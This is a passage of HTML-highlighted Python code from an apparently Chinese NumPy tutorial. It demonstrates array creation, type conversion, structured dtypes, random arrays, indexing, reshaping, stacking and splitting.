punctuation\">.</span>diag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 代码 2-9</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用ones函数的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>ones<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># 代码 2-10</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为浮点型</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int8<span class=\"token punctuation\">(</span><span class=\"token number\">42.0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 浮点型转换为整型</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整型转换为布尔型</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'转换结果为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 布尔型转换为浮点型</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># 代码 2-11</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>df <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>str_<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"numitems\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>int64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>               <span class=\"token punctuation\">(</span><span class=\"token string\">\"price\"</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>float64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># 代码 2-12</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数据类型为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">(</span>df<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># 代码 2-13</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>itemz <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tomatoes\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"cabbages\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.72</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                 dtype<span class=\"token operator\">=</span>df<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'自定义数据为：'</span><span class=\"token punctuation\">,</span> itemz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># 代码 2-14</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\"># 代码 2-15</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\"># 代码 2-16</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randn<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\"># 代码 2-17</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'生成的随机数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 代码 2-18</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 用整数作为下标可以获取数组中的某个元素</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># 用范围作为下标获取数组的一个切片，包括 arr [3] 不包括 arr [5]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 省略开始下标，表示从 arr [0] 开始</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># 下标可以使用负数，-1 表示从数组后往前数的第一个元素</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>arr<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 下标还可以用来修改元素的值</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token comment\"># 范围中的第三个参数表示步长，2 表示隔一个元素取一个元素</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 步长为负数时，开始下标必须大于结束下标</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token comment\"># 代码 2-19</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 0 行中第 3 和第 4 列的元素</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token comment\"># 索引第 2 和第 3 行中第 3 列、第 4 列和第 5 列的元素</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：\\n'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2 列的元素</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># 代码 2-20</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token comment\"># 从两个序列的对应位置取出两个整数组成下标：arr [0,1], arr [1,2], arr [2,3]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2、3 行中第 0、2、3 列的元素</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>mask <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token comment\"># mask 是一个布尔数组，它索引第 1、3 行中第 2 列的元素</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>mask<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># 代码 2-21</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'新的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置数组的形状</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组维度为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ndim<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组维度</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token comment\"># 代码 2-22</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平后为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>ravel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token comment\"># 代码 2-23</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 横向展平</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 纵向展平</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\"># 代码 2-24</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组1为：'</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>arr2 <span class=\"token operator\">=</span> arr1 <span class=\"token operator\">*</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组2为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hstack 函数横向组合</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># 代码 2-25</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vstack 函数纵向组合</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token comment\"># 代码 2-26</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数横向组合</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数纵向组合</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token comment\"># 代码 2-27</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hsplit 函数横向分割</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\"># 代码 2-28</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vsplit 函数纵向分割</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token comment\"># 代码 2-29</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span 